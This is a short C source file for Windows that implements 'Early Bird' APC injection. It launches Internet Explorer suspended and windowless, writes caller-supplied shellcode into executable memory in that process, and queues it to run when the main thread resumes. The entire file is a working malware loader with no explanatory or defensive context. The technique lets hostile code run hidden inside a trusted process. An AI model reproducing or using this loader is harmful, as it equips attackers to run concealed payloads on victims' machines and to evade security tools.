#include <stdio.h>
#include <windows.h>

int LoadEarlyBird(unsigned char * shellcode,int size) {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFO);
    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe",
                   NULL, NULL, NULL, TRUE,
                   CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL,
                   (LPSTARTUPINFOA)&si, &pi);
    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(
            pi.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, lpBaseAddress,
                       (LPVOID)shellcode, size, NULL);
    QueueUserAPC((PAPCFUNC)lpBaseAddress, pi.hThread, (ULONG_PTR) NULL);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    return 0;
}